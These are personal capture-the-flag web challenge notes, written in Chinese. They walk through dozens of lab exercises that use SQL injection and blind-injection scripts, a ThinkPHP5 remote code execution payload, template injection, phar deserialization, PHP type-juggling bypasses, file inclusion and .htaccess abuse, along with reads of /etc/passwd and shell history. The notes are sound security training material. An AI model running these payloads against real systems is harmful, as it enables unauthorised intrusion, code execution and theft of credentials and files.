[大佬的视频解析](https://www.ichunqiu.com/course/56483)

## nothing (i春秋)

下载完tar文件，load进docker镜像里，`docker load < backdoor.tar`，启动容器并进入镜像`docker exec -it 65109cea4812 /bash/bin`

![image](http://note.youdao.com/yws/res/881/41FC2E36761B4B598C1668F3DA559FB3)

https://www.ichunqiu.com/course/56341

https://github.com/akamajoris/php-extension-backdoor

post： string=echo `cat /var/www/html/flag.php`



## try

1. 查看源码可以看见/level.php/?name=guest，尝试`?name=guest'and'1'='1`返回正确，`?name=guest'and'1'='2`返回异常，发现注入，`?name=guest'+order+by+1%23`返回正常，`?name=guest'+order+by+2%23`返回失败，说明字段数只有一列

2.爆破
```
?name=-1' union select database()%23 //爆破数据库，ctf

?name=-1' union select group_concat(table_name) from information_schema.tables where table_schema='ctf'%23 //爆破表，token,user

?name=-1' union select group_concat(column_name) from information_schema.columns where table_name='user'%23 //爆破列，username,password,level

?name=-1' union select concat(username,0x23,password,0x23,level) from user limit 0,1%23 //爆破值，password得到一串码
```
$6$rounds=66$nHxhhCl/k9nL5Df47FWdXFZIjRgzV2gXmVdHybywlQ3RIQ/2FvUM/L1y3mgnUBRvJNw9I0Qc5uRbc6EUwxB87/，和reset.php里一致

3.重置密码，在reset_do.php输入在数据库爆出的验证码，显示token不正确，需要重新获取，果然回到数据库，失败一次后数据库token被清空，需求在reset.php重新获取，所以只能利用注入爆破验证码


4.在reset.php的源码中有提示

![image](http://note.youdao.com/yws/res/927/82CB36AC77FB402485EEFBFBD95D0C65)

经过搜索找到这个php crypt的share12加密算法，rounds=5000代表算法循环5000次，当指定次数小于1000时，也会最低循环1000次，所以这里说程序员用错了算法

![image](http://note.youdao.com/yws/res/925/2EFC96B2C08C48E9878469B17F4B7671)

经验证，以下通过sha512加密得到的与题目一致，这里出题人写的博客记录了这个漏洞，http://www.91ri.org/14547.html

```
<?php
echo 'SHA-512:' . crypt('bctf2016', '$6$rounds=66') . "\n";
?>
```

利用reset操作计算验证码，`/level.php?name=-1' union select concat(0x23,token,0x23) from token where username = 'member'%23`

```
import urllib2
import urllib
import sys
import requests

def getpass():
    html = requests.options('http://8fb6a7f18e9841cba75ec373f64821f9cadcd4396ed045af.changame.ichunqiu.com/level.php?name=-1%27%20union%20select%20concat(0x23,token,0x23)%20from%20token%20where%20username%20=%20%27member%27%23').text
    print(html)
    fd1 = html.find('#')
    fd2 = html.find('#', fd1+1)
    return html[fd1+1:fd2]

def reset():
    data = {'username': 'member'}
    data = urllib.urlencode(data)
    html = urllib2.urlopen('http://8fb6a7f18e9841cba75ec373f64821f9cadcd4396ed045af.changame.ichunqiu.com/reset.php', data).read()


fp = open('ichunqiu.txt', 'r')
hs = fp.readlines()
fp.close()
for i in range(1000):
    reset()
    pwd = getpass()
    print(str(i))
    for j in hs:
        if pwd in j:
            print(j)
            print('token found')
            sys.exit(0)
```

最终跑出来验证码，重置成功，多跑几次，有的时候会报错，![image](http://note.youdao.com/yws/res/949/1663B1AC30F043DBB75B2D8E6FC9AC55)

5.登录后提示flag在Get_Fl3g_e165421110ba03099a1c0393373c5b43.php，然后访问提示.txt，访问Get_Fl3g_e165421110ba03099a1c0393373c5b43.txt，出现源码，代码审计，通过?_SERVER[_SESSION][admin]=yes绕过

最后找到flag，但提交不正确
![image](http://note.youdao.com/yws/res/963/46DA5245CC5348A5B6FBBA97BB5B6EF5)

[出题人讲解视频](https://www.ichunqiu.com/course/56349)

## blog进阶

1.第一步和前面相似，注入得出admin和19-10-1997进到管理页面，这里伪协议失效了，但是文件包含还是可以执行，访问/blog_manage/manager.php?module=../robotxs&name=txt可以看见flag.php路径

2.这题是利用php对POST上传文件临时保存，在/tmp路径下，文件名为php{0-9A-Za-z}的随机字符，如果文件被php文件本身用到了，则php直接使用/tmp里的这个临时文件，如果没用到或者处理完毕了，则将/tmp下的这个临时文件删除。
也就是说，在正常处理流程下，tmp目录下的这个文件存活周期是一次请求到响应，响应过后，它就会被删除，

因为kindeditor那里存在的目录遍历漏洞，导致我们可以查看tmp目录下的文件列表，我们也可以对任一php文件post一个文件过去，使其暂存于tmp目录下，问题就在于，我们还没来得及包含这个文件，它就会在这次请求结束后被删除掉。

通过无穷递归导致栈溢出，/X.php?include=X.php,使php无法进行此次请求的后续处理，也就是删除/tmp目录中我们通过post强行上传的临时文件。

3.本地新建一个post
```
<!DOCTYPE html> 
<html> 
<head lang="en"> 
  <meta charset="UTF-8"> 
  <title>上传文件</title> 
</head> 
<body> 
//上传的路径包含自己本身，形成无限循环
<form action="http://bc691d207104471d8f78e43b4730424107fd1e27245e401a.changame.ichunqiu.com/blog_manage/manager.php?module=manager&name=php" method="post" enctype="multipart/form-data"> 
  <input type="file" name="file"/> 
  <input type="submit" value="提交"> 
</form> 
</body> 
</html>
```

![image](http://note.youdao.com/yws/res/988/B41810D56FA046D0AB2F3D18CFF70BF4)

访问/kindeditor/php/file_manager_json.php?path=../../../../../tmp/可以看见临时文件php5IXvQg，浏览器访问/blog_manage/manager.php?module=../../../../../tmp/php5IXvQg&name=phpa，php后面必须加任意字符才能访问到，不清楚为什么

![image](http://note.youdao.com/yws/res/990/7C87F08968CB428E8EF74E8293467A4C)

4. 上传读取flag.php的文件

```
<?php
copy("/var/www/html/flag.php","/tmp/flag.txt");
show_source("/tmp/flag.txt");
//注意要用到show_source函数显示源码，否则会被解析，从下面也可以看到，flag的内容是在注释当中的
?>
```

为什么用copy而不是webshell，是因为在phpinfo里可以看见大部分函数都被禁用了

[大佬的博客1](https://blog.csdn.net/qq_30123355/article/details/58165038?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-4&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-4)

[大佬的博客2](https://blog.csdn.net/weixin_43940853/article/details/104602695?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-6&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-6)

## 

> 第一关：
winhex打开pcap文件，筛选http，追踪tcp流可以看见cookie里面有个user字段,这里的M3Iyp3D%3D是先经过base64编码，在rot13编码

![image](http://note.youdao.com/yws/res/1013/E54A29EFA65D48FEA288192492A6D3B8)

用Python脚本读pcap文件，找出user的盲注sql语句

```
from urllib import unquote
import base64

fp = open('1.pcapng', 'r')
html = fp.readlines()

fp.close()

for i in html:
    fd = i.find('user=')
    fd1 = i.find(';', fd)
    if fd1==-1:
        fd1 = i.find('\r', fd)
    if fd!=-1:
        m = base64.b64decode(unquote(i[fd+5:fd1]).decode('rot_13'))
        print(m)
```

盲注注入message表sqlmap的注入特点是当找到正确的字符时会进行!=不等于判断 所以可以查找这个关键字

```
fp = open('hhhh.txt', 'r')
html = fp.readlines()
l = ''
for m in html:
    if m.find('message') != -1 and m.find('!=') != -1:
        if m.find('LIMIT 0,1)') != -1:
            t1 = m.find('!=')
            t2 = m.find(',', t1)
            l += chr(int(m[t1+2:t2]))
print(l)
//my_password_is_ilovedaliang0，第一关的message，但是得去掉最后的0，查看了下txt，最后一句sql的payload和前几句不一样
```

> 第二关

https://bbs.ichunqiu.com/thread-16297-1-1.html

## extract在变量中（bugku）
```
<?php
$flag='xxx';
extract($_GET);
if(isset($shiyan))
{
$content=trim(file_get_contents($flag));
if($shiyan==$content)
{
echo'flag{xxx}';
}
else
{ echo'Oh.no';}}
?>
```

extract()会把符号表中已存在的变量名的值替换掉，将flag变量的值赋给名为content变量，如果变量shiyan和变量content的值相同，就输出flag的值

payload： ?shiyan=&flag=

## strcmp比较字符串（bugku）

```
<?php
$flag = "flag{xxxxx}";
if (isset($_GET['a'])) {
if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 < 0； 如果 str1大于 str2返回 > 0；如果两者相等，返回 0。
//比较两个字符串（区分大小写）
die('Flag: '.$flag);
else
print 'No';
}
?>
```
构造数组绕过strcmp比较大小

payload: ?a[]=1

## urldecode二次编码绕过(bugku)

```
<?php
if(eregi("hackerDJ",$_GET[id])) {
    echo("not allowed!");
    exit();
}
$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "hackerDJ")
{
echo "Access granted!";
echo "flag";
}
?>
```
eregi字符串比对解析，与大小写无关。利用两次urldecode第一次是浏览器的解码第二次是函数的解码,

payload: ?id=hacker%2544J

## md5()函数(bugku)

```
<?php
error_reporting(0);
$flag = 'flag{test}';
if (isset($_GET['username']) and isset($_GET['password'])) {
if ($_GET['username'] == $_GET['password'])
    print 'Your password can not be your username.';
else if (md5($_GET['username']) === md5($_GET['password']))
    die('Flag: '.$flag);
else print 'Invalid password';
}
?>
```

利用MD5没有办法处理数组的缺陷，绕过判断

payload: ?uasrname[]=1&password[]=2

## 数组返回NULL绕过(bugku)

```
<?php
$flag = "flag";

if (isset ($_GET['password'])) {
    if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
    echo 'You password must be alphanumeric';
    else if (strpos ($_GET['password'], '--') !== FALSE)
    die('Flag: ' . $flag);
else
    echo 'Invalid password';
}
?>
```

利用ereg只能匹配字符，构造数组绕过

payload: ?password[]=1

## 弱类型整数大小比较绕过（bugku）

```
$temp = $_GET['password'];
is_numeric($temp)?die("no numeric"):NULL;
if($temp>1336){
echo $flag;
```
is_numeric用于检测变量是否为数字或数字字符串，不能判断数组，构造数组绕过

Payload: password[]=1

## sha()函数比较绕过(bugku)

```
<?php
$flag = "flag";
if (isset($_GET['name']) and isset($_GET['password']))
{
var_dump($_GET['name']);
echo "";
var_dump($_GET['password']);
var_dump(sha1($_GET['name']));
var_dump(sha1($_GET['password']));
if ($_GET['name'] == $_GET['password'])
echo 'Your password can not be your name!';
else if (sha1($_GET['name']) === sha1($_GET['password']))
die('Flag: '.$flag);
else echo 'Invalid password.';
}
```
==弱比较是比较字符，sha1()可以构造数组绕过

payload: ?name[]=1&password[]=2

## md5加密相等绕过(bugku)

```
<?php
$md51 = md5('QNKCDZO');
$a = @$_GET['a'];
$md52 = @md5($a);
if(isset($a)){
if ($a != 'QNKCDZO' && $md51 == $md52) {
echo "flag{*}";
} else {
echo "false!!!";
}}
else{echo "please input a";}
?>
```

根据MD5的特性，有两点漏洞

1. 两个开头为0的md5值相同。
2. md5不能处理数组。
3. PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。

常见0e开头的md5和原值：

QNKCDZO
0e830400451993494058024219903391

s878926199a
0e545993274517709034328855841020

s155964671a
0e342768416822451524974117254469

s214587387a
0e848240448830537924465865611904

s214587387a
0e848240448830537924465865611904

s878926199a
0e545993274517709034328855841020

## 十六进制与数字比较（bugku）

函数要求变量$temp不能存在1~9之间的数字，最后，又要求$temp=3735929054;

这本来是自相矛盾的，但php在转码时会把16进制转化为十进制.于是把
3735929054转换成16进制为0xdeadc0de，记得带上0x；
构造payload

?password=0xdeadc0de

## ereg正则%00截断(bugku)

1. ereg() 正则限制了password格式，只能是一个或者多个数字、大小写字母
2. strpos() 查找某字符串在另一字符串中第一次出现的位置（区分大小写），本题中需要匹配到"*-*"才能输出flag

ereg() 只能处理字符串，而password是数组，所以返回的是null，三个等号的时候不会进行类型转换。所以null!==false。

strpos() 的参数同样不能够是数组，所以返回的依旧是null，null!==false也正确。

Payload：?password[]=1

## strpos数组绕过(bugku)

1. 同前面几题，ereg()只能处理字符串的，遇到数组做参数返回NULL，判断用的是 === ，其要求值与类型都要相同，而NULL跟FALSE类型是不同的,
2. trpos函数遇到数组，也返回NULL，与FALSE类型不同，if条件成立，输出flag。

payload:?ctf[]=2

## 数字验证正则绕过(bugku)

```
<?php
error_reporting(0);
$flag = 'flag{test}';
if ("POST" == $_SERVER['REQUEST_METHOD'])
{
$password = $_POST['password'];
if (0 >= preg_match('/^[[:graph:]]{12,}$/', $password)) //preg_match — 执行一个正则表达式匹配  [: graph:] 表示任意一个可打印字符。也就是说，要求$password长度大于12
{
echo 'flag';
exit;
}
while (TRUE)
{
$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/';
//只要匹配到一个标点符号、或者匹配到一个数字、或者一个大写字母、或者一个小写字母，即为匹配成功
if (6 > preg_match_all($reg, $password, $arr))
break;
$c = 0;
$ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母
foreach ($ps as $pt)
{
if (preg_match("/[[:$pt:]]+/", $password))
$c += 1;
}
if ($c < 3) break;
//>=3，//必须包含四种类型三种与三种以上, $password中包含标点符号、数字、大写字母、小写字母中三种及以上的类型
if ("42" == $password) echo $flag; //弱类型比较，前两位是数字42的字符串
else echo 'Wrong password';
exit;
}
}
```

Payload: ?password=42aaAaa2;aaaa

## php_rce（攻防世界）

phpthink5漏洞

```
?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20%27system("ls");%27

?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20%27system("find / -name 'flag'");%27
```

## Web_python_template_injection（攻防世界）

python模板注入

尝试url/{{7+7}}执行

```
url/{{''.__class__.__mro__[2].__subclasses__()}}

url/{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}

url/{{''.__class__.__mro__[2].__subclasses__()[40]('fl4g').read()}}

```

## supersql（攻防世界）

1.
```
?inject=1';show columns from `words`;--+
```

## 4月24日正则盲注

[题目地址](http://47.102.127.194:8801/)

源码

```
<?php 
include "config.php";
error_reporting(0);
highlight_file(__FILE__); 

$check_list = "/into|load_file|0x|outfile|by|substr|base|echo|hex|mid|like|or|char|union|or|select|greatest|%00|_|\'|admin|limit|=_| |in|<|>|-|user|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i";
if(preg_match($check_list, $_POST['username'])){
    die('<h1>Hacking first,then login!Username is very special.</h1>'); 
}
if(preg_match($check_list, $_POST['passwd'])){
    die('<h1>Hacking first,then login!No easy password.</h1>');
}
$query="select user from user where user='$_POST[username]' and passwd='$_POST[passwd]'"; 
$result = mysql_query($query);
$result = mysql_fetch_array($result);
$passwd = mysql_fetch_array(mysql_query("select passwd from user where user='admin'"));
if($result['user']){
    echo "<h1>Welcome to CTF Training!Please login as role of admin!</h1>"; 
}
if(($passwd['passwd'])&&($passwd['passwd'] === $_POST['passwd'])){
    $url = $_SERVER["HTTP_REFERER"];
    $parts = parse_url($url);
    if(empty($parts['host']) || $parts['host'] != 'localhost'){
        die('<h1>The website only can come from localhost!You are not admin!</h1>');
    }
    else{
        readfile($url);
    }
}
?> 

```

主要是这句

```
$query="select user from user where user='$_POST[username]' and passwd='$_POST[passwd]'"
```

明显的单引号注入，但是大部分sql关键字都被过滤了，但是

`or`可以用`||`代替

`空格`可以用`\**\`代替

`# -` ，我们用`;%00`绕过

```
payload: username=\&passwd=||passwd/**/REGEXP/**/"^d";%00
```
![image](http://note.youdao.com/yws/res/1199/13E30A0DA9334B46B8F9BACA596D6ABA)

用sql表示出来是这样，可以看出第一个\闭合了后面的单引号和' passwd=，意思第一对单引号里的内容是`''\' and password='`，后面or语句用正则匹配密码开头第一个字母为d的行

可以用brup一个字一个字的注入

![image](http://note.youdao.com/yws/res/1211/66F79AEBD179433A9B09D7F32A91C540)

然后用 admi/**/n和密码登录

然后用Referer利用file://localhost/var/www/html/flag.php伪造本地读文件即可

https://www.freesion.com/article/1270397693/

https://blog.csdn.net/weixin_45940434/article/details/103722055?fps=1&locationNum=2


## 4月25日注入题

1. 使用fuzz字典发送过滤了绝大多数关键字，#，|（位或），^异或没有被过滤
2. 构建payload
```
username=admin’|(ascii(mid((password)from(1)))>53)#&password=sd 
//判断mid查出的字符的第一个字符的ascii码
MID(column_name,start[,length])   //因为过滤掉空格的原因，才用上述格式
```

这里用的是位或，用异或也可以，或者用或

3.当第一个字母的ascii等于53时，后半边为false，也就是0，前半边'admin' | 0等同于0 | 0，因为字符串和数字比较时，会把字符串转为浮点数，做隐式类型转换，所以位或得出0，而usernmae=0时返回所有值，因为弱类型比较

4.python脚本

```
import requests
url = "http://123.206.41.254:8080/index.php"
r = requests.Session()
result=''
for i in range(1,33):
 for j in range(37,127):
  payload = "admin'|(ascii(mid((password)from({0})))>{1})#".format(str(i),str(j))
  data={"username":payload,"password":"psdvs"}
  print(payload)
  html=r.post(url,data=data)
  if "password error" in html.content:
   result+=chr(j)
   print(result)
   break
print(result)
```

5.用或时，让后半部分不等于,构造payload也可以得出
```
username=admin’|(ascii(mid((password)from(1)))<>53)#&password=sd 
```

http://www.ee50.com/zx/webaq/1061.html

## 2018_wdb_comment（网鼎杯2018）

1.git源码泄露，查看源码，二次注入，可以发现category第二次提取出来的时候没有进行过滤就直接放到sql语句了

![image](http://note.youdao.com/yws/res/1253/9FC89B100F0F4AEE88FF221E8BB74314)

sql语句是换行执行的，#进行注释只能注释当前行，所以我们这里用/**/进行拼接注释。

构造payload

```
$sql = "insert into comment
            set category = '123',content=user(),/*',
                content = '*/#',
                bo_id = '$bo_id'";
```
第二行content被注释掉，但是得二次注入在content里输入*/#才能显示

依次注入
```
//查看www用户目录
payload:123',content=(select( load_file('/etc/passwd'))),/* 
//读history文件
123',content=(select(load_file('//home/www/.bash_history'))),/*
//在/tmp/html下有个.DS_Store文件，长度不够用hex读
123',content=(select hex(load_file('/tmp/html/.DS_Store'))),/*
//十六进制转文字发现flag_8946e1ff1ee3e40f.php
123',content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*
```

## fakebook （网鼎杯2018）

1.存在.bak文件，源码如下
![image](http://note.youdao.com/yws/res/1276/D225B77164884B3693BE6111A9DC38F8)

2.注册账号后，发现url存在get参数的数字型注入，order by可以发现有四列，过滤了union select，中间加/**/绕过，常规注入后，在user表的data列里看见一串序列化字符串

![image](http://note.youdao.com/yws/res/1287/403775DA401C4CB492DF411A204E4164)

3. 在源码里可以看见getblogcontent函数里有$this->get($this->blog);因此我们只要构造blog的路径指向flag.php

![image](http://note.youdao.com/yws/res/1296/3CCC6A87654A43138D7921536123F811)

## CISCN_2019_northern_China_day1_web1

**phar反序列化**

[一篇介绍php魔术方法的博客](https://www.cnblogs.com/20175211lyz/p/11403397.html#%E5%85%ADphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)

[介绍phar反序列化的blog1](https://www.freebuf.com/articles/web/205943.html)

[这个博客很好](https://paper.seebug.org/680/)

1.登录后发现利用下载接口可以传入路径获取网站源码

![image](http://note.youdao.com/yws/res/1345/0876CF125AE3431F9DD124A15BF6ACFD)

```
//class.php

<?php
error_reporting(0);
$dbaddr = "127.0.0.1";
$dbuser = "root";
$dbpass = "root";
$dbname = "dropbox";
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);

class User {
    public $db;

    public function __construct() {
        global $db;
        $this->db = $db;
    }

    public function user_exist($username) {
        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }

    public function add_user($username, $password) {
        if ($this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        return true;
    }

    public function verify_user($username, $password) {
        if (!$this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($expect);
        $stmt->fetch();
        if (isset($expect) && $expect === $password) {
            return true;
        }
        return false;
    }

    public function __destruct() {
        $this->db->close();
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct($path) {
        $this->files = array();
        $this->results = array();
        $this->funcs = array();
        $filenames = scandir($path);

        $key = array_search(".", $filenames);
        unset($filenames[$key]);
        $key = array_search("..", $filenames);
        unset($filenames[$key]);

        foreach ($filenames as $filename) {
            $file = new File();
            $file->open($path . $filename);
            array_push($this->files, $file);
            $this->results[$file->name()] = array();
        }
    }

    public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }

    public function __destruct() {
        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
        $table .= '<thead><tr>';
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
        }
        $table .= '<th scope="col" class="text-center">Opt</th>';
        $table .= '</thead><tbody>';
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
            }
            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
            $table .= '</tr>';
        }
        echo $table;
    }
}

class File {
    public $filename;

    public function open($filename) {
        $this->filename = $filename;
        if (file_exists($filename) && !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }

    public function name() {
        return basename($this->filename);
    }

    public function size() {
        $size = filesize($this->filename);
        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
        return round($size, 2).$units[$i];
    }

    public function detele() {
        unlink($this->filename);
    }

    public function close() {
        return file_get_contents($this->filename);
    }
}
?>
```
可以看见三个类，user,Filelist,File。可以看到file类里的close方法有file_get_contents

2.思路是构造pop链，User类中存在close方法，并且该方法在对象销毁时执行。

同时FileList类中存在call魔术方法，并且类没有close方法。

如果一个Filelist对象调用了close()方法，根据call方法的代码可以知道，文件的close方法会被执行，就可能拿到flag。

如果能创建一个user的对象，其db变量是一个FileList对象，对象中的文件名为flag的位置。这样的话，当user对象销毁时，db变量的close方法被执行；而db变量没有close方法，这样就会触发call魔术方法，进而变成了执行File对象的close方法。通过分析FileList类的析构方法可以知道，close方法执行后存在results变量里的结果会加入到table变量中被打印出来，也就是flag会被打印出来。

3.生成phar，利用//phar:伪协议读取flag，运行下列php文件，生成phar文件

```
<?php

class User {
    public $db;
}

class File {
    public $filename;
}
class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct() {
        $file = new File();
        $file->filename = '/flag.txt';
        $this->files = array($file);
        $this->results = array();
        $this->funcs = array();
    }
}

@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar

$phar->startBuffering();

$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

$o = new User();
$o->db = new FileList();

$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("exp.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

4. 修改后缀为png，上传成功后，利用delete.php读取源码

![image](http://note.youdao.com/yws/res/1364/59BFF5912B1B447DB4EA0AD583FB5F92)

转而用delete.php可能是因为download.php过滤了flag字样

## mfw

.git下载源码

```
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```

payload: ?page=1') or system("cat templates/flag.php");//


## web2

```
/*
   逆向加密算法，解密$miwen就是flag
*/

function decode($str){
    $s = base64_decode(strrev(str_rot13($str)));
    for($a = 0; $a < strlen($s); $a++){
        $b=substr($s,$a,1);
        $c=ord($b)-1;
        $b=chr($c);
        $f=$f.$b;
    }
    return strrev($f);
}
echo decode($miwen);

?> 

```

## asis_2019_unicorn_shop

## online_tool

![image](http://note.youdao.com/yws/res/1382/54EDC0DF09B64D9798DFF70779A8C18F)

1.经过escapeshellarg处理后变成了`'172.17.0.2'\'' -v -d a=1'`，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。

2.经过escapeshellcmd处理后变成`'172.17.0.2'\\'' -v -d a=1\'`，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义

3.最后执行的命令是` '172.17.0.2'\\'' -v -d a=1\' `，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。

https://blog.csdn.net/weixin_44077544/article/details/102835099

## ciscn_2019_northern_china_day2_web1 Hack World

第二次做这题，fuzz一下发现空格以及一些关键字被过滤，用异或，0^1=1，?id=1时返回正确response

```
import requests
import time

url = "http://172.16.4.116:8302/index.php"

payload={'id':'1'}

temp = ''
for i in range(1, 2):
    for p in range(32, 126+1):
        payload['id'] = "0^" + "(ascii(substr((select(flag)from(flag)),{0},1))={1})".format(i,p)
        print(payload['id'])
        html = requests.post(url,data=payload).text
        # print(html)
        if 'Hello' in html:
            temp += chr(p)
            print(temp)
            break
print(temp)
```

## fbctf_2019_products_manager

sql约束攻击

通过调节字节长度，注册超过源码规定的长度的name从而达到覆盖的效果，但是本地复现失败，在于描述字段会覆盖原有flag


## FlatScience(攻防世界)

1. login.php?debug出现源码，login.php的username存在注入点，单引号注入，这里是sqlite数据库，payload:构造usr=' union select name,sql from sqlite_master--+&pw=，在cokkie里可以看见sql原句

![image](http://note.youdao.com/yws/res/1419/554A808F40374025882FC53C3E002236)

2.
usr=%27 UNION SELECT id, id from Users limit 0,1--+&pw=chybeta 查询出name,再查询出password等

3. 这里的password是用sha1加密，hint提示密码藏在pdf里
4. 写脚本爬取站点所有pdf,sha1密码碰撞

```
from cStringIO import StringIO
from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter
from pdfminer.converter import TextConverter
from pdfminer.layout import LAParams
from pdfminer.pdfpage import PDFPage
import sys
import string
import os
import hashlib
 
def get_pdf():
	return [i for i in os.listdir("./") if i.endswith("pdf")]
 
 
def convert_pdf_2_text(path):
    rsrcmgr = PDFResourceManager()
    retstr = StringIO()
    device = TextConverter(rsrcmgr, retstr, codec='utf-8', laparams=LAParams())
    interpreter = PDFPageInterpreter(rsrcmgr, device)
    with open(path, 'rb') as fp:
        for page in PDFPage.get_pages(fp, set()):
            interpreter.process_page(page)
        text = retstr.getvalue()
    device.close()
    retstr.close()
    return text
 
 
def find_password():
	pdf_path = get_pdf()
	for i in pdf_path:
		print "Searching word in " + i
		pdf_text = convert_pdf_2_text(i).split(" ")
		for word in pdf_text:
			sha1_password = hashlib.sha1(word+"Salz!").hexdigest()
			if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c':
				print "Find the password :" + word
				exit()
 
if __name__ == "__main__":
	find_password()
```
得出password: ThinJerboa

## hitcon_2016_leaking

node.js沙箱逃逸问题，node.js8.0版本前当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。

```
import requests
import time
url = 'http://402a95ea-15ad-46a2-be88-35e62822cb27.node3.buuoj.cn/?data=Buffer(500)'
response = ''
while 'flag' not in response:
        req = requests.get(url)
        response = req.text
        print(req.status_code)
        time.sleep(0.1)
        if 'flag{' in response:
            print(response)
            break  

```

## ics-04

查询用户页存在注入，查到用户名后，可以利用用户名重新注册

## ics-05

1.index.php源码里发现？page=index.php，存在文件包含漏洞，访问?page=php://filter/read=convert.base64-encode/resource=index.php读取源码

![image](http://note.youdao.com/yws/res/1447/F73571AFA6F746308928FCEA1CDC494A)

2.头部添加x-forwarded-for,当pre_replace的参数pattern输入/e的时候 ,参数replacement的代码当作PHP代码执行

构造payload:?pat=/123/e&rep=system("cat+./s3chahahaDir/flag/flag.php")&sub=123

## huwangbei_2018_easy_laravel

https://www.cnblogs.com/tr1ple/p/11044313.html

## insomniteaser_2019_l33t_hoster

https://xz.aliyun.com/t/3941

## wtf.sh-150

路径穿透

https://blog.csdn.net/qq_40884727/article/details/100598140

## upload (攻防世界)

1.上传的文件名存在注入，使用s'+(selselectect CONV(substr(hex(dAtaBase()),1,12),16,10))+'.jpg注入，这里用到了CONV，不转成数字，完全没有回显结果，所以用hex先将字符转换成16进制，然后用CONV函数将16进制转化为10进制，依次获取子串的12位，用substr截取12是因为一旦过长，会用科学计数法表示。

2.依次注入显示数据库的前12位后12位，得到数据库名为web_upload

3. 注入表名，s'+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = 'web_upload' limit 1,1)),1,12),16,10))+'.jpg，最后得到表名为hello_flag_is_here
4. 同理得到flag


## blgdel(攻防世界)

1.扫描源码可以看见sql.txt,config.txt；

2.user.php存在上传点，推荐人被填写10次才能有等级

3.confi.php里过滤掉了尖括号，所以上传php不能被执行

4.上传.htaccess文件，可以通过利用config里注册的master协议,来进行文件搜索.，包含成功的话，这个文件的内容会映射到test.php里面，构造htaccess文件，内容为php_value auto_append_file master://search/path=%2fhome%2f&name=flag

5.再上传一个php文件，访问能看到flag位置回显到PHP上，再上传.htaccess，php_value auto_append_file /home/hiahiahia_flag


## lctf_2018_bestphp_s_revenge

https://cloud.tencent.com/developer/article/1376384

## meepwn_2018_pycalx

bool型回显注入

1.代码审计，get_op()这个函数首先是限制运算符的有效长度为2，然后通过黑名单+，-，/，*，=，!限制了运算符的第一个字节，第二个字节没做限制。

![image](http://note.youdao.com/yws/res/1519/FC38B1E666484752A049E9321A0BDB36)

